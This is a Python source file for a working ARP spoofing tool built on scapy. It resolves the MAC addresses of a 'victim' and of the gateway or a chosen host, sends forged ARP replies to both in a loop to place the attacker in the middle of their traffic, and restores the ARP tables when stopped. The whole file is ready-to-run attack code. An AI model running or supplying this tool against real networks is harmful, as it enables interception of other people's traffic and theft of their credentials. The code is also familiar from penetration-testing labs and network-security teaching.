import optparse
import ipaddress
import netifaces
from termcolor import colored
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


INFO = lambda x :  colored('[+] ' + x, 'green')
DANGER = lambda x : colored('[!] ' + x, 'red') 
BLUE = lambda x : colored(x , 'blue')
victim_alive = False

def restore(DestinationIP, SourceIP):
	DestinationMAC = getmac(DestinationIP)
	SourceMAC = getmac(SourceIP)
	packet = ARP(op=2, pdst=DestinationIP, hwdst=DestinationMAC, psrc=SourceIP, hwsrc=SourceMAC)
	send(packet, count=6, verbose=False)

def getmac(ip):
	arp_request = ARP(pdst=ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	try : 
		answered_list = srp(arp_request_broadcast, timeout=1,
								verbose=False)[0]
		return answered_list[0][1].hwsrc
	except IndexError :
		print(DANGER("Coudn't find the Mac address .. Exit"))
		exit(0) 

def ArpSpoof(mac ,victim, spoof):
	packet = ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof)
	send(packet, verbose=False)

def alive() : 
	global victim_alive 
	victim_alive = True

def check_connection(victim) :  
	ans, unans = sr(IP(dst=victim)/ICMP() , verbose=0 , timeout = 2)
	f = lambda s,r : alive()
	ans.summary( f)
	if victim_alive : 
		print(INFO(victim + " is alive"))
	else : 
		print(INFO(victim+ " is not alive"))

def gateway() : 
	gws = netifaces.gateways()
	ip_default_getway = gws['default'][netifaces.AF_INET][0]
	return ip_default_getway

def main():
	parser = optparse.OptionParser(
		'Usage of the program: ' + '-t <target IP>' + ' -s <spoof IP>\n')
	parser.add_option('-t', '--target', dest='victim', type='string',
					  help='specify a target IP, the victim IP)')
	parser.add_option('-s', '--spoof', dest='spoof', type='string',
					  help='specify a spoof IP or a pretend IP, usually the gateway of the network)')
	parser.add_option('-c', '--check', action="store_true", default=False,
					  help='check connectivity of the victim , by default is False')
	parser.add_option('-v', '--verbose', action="store_false", default=True,
					  help='Set verbose to False')
	options , args  = parser.parse_args()
	victim = options.victim
	victim = victim.strip()
	spoof = options.spoof
	number_packets = 0
	if spoof :  spoof = spoof.strip()
	check = options.check
	verbose = options.verbose
	if (options.victim == None):
		parser.print_help()
	if (options.spoof == None):
		if verbose : print(INFO("default ip spoof : ") , end="")
		spoof = gateway()
		if verbose : print(BLUE(spoof))
	try : 
		ip_spoof = ipaddress.ip_address(spoof)
		ip_victim = ipaddress.ip_address(victim)
	except ValueError as e: 
		if verbose :  print(DANGER("Error in IP format"))
		return 0
	if check : 
		check_connection(victim)
	try:
		mac_victim = getmac(victim) 
		mac_spoof = getmac(spoof) 
		if verbose : 
			print(INFO("Victim MAC : " + mac_victim))
			print(INFO("Spoof MAC  : " + mac_spoof))
		print(INFO("Spoof starting ... ") , end="")
		while True:
			ArpSpoof( mac_victim , victim, spoof)
			ArpSpoof(mac_spoof ,spoof, victim)
			number_packets += 2
			if verbose : print("\r" + INFO("Packets sent: " + str(number_packets)), end="")
			time.sleep(3)
	except KeyboardInterrupt :
		restore(victim  , spoof)
		restore(spoof , victim)
		if verbose : print(INFO("Goodbye"))
		return 0
		
if __name__ == "__main__" : 
	main()
